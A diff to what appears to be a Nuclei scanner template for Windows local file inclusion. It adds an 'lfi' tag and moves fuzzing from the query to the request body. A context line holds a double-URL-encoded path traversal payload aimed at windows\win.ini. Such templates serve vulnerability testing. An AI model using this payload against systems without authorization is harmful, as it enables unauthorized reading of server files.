@@ -4,7 +4,7 @@ info:
   name: Local File Inclusion - Windows
   author: reewardius
   severity: high
-  tags: fuzzing-req,fuzzing-req-body
+  tags: fuzzing-req,fuzzing-req-body,lfi
 
 http:
   - pre-condition:
@@ -60,7 +60,7 @@ http:
           - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini'
 
     fuzzing:
-      - part: query
+      - part: body
         type: replace # replaces existing parameter value with fuzz payload
         mode: multiple # replaces all parameters value with fuzz payload
         fuzz:
